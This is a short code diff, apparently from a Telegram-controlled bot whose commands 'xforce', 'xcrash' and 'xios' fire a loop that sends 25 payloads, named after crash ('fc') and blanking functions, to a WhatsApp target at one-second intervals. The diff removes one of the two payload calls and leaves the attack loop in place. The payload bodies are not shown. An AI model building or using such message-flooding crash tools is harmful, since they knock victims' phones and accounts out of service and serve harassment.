@@ -4072,7 +4072,6 @@ bot.hears(/^(\/)?(xforce|xcrash|xios)(\s|$)/i, checkWhatsAppConnection, checkPre
 
   for (let i = 0; i < 25; i++) {
     await AmbaFcNewVIP(sock, target);
-    await blankbyambajahat(sock, target);
     await new Promise((r) => setTimeout(r, 1000));
   }
 
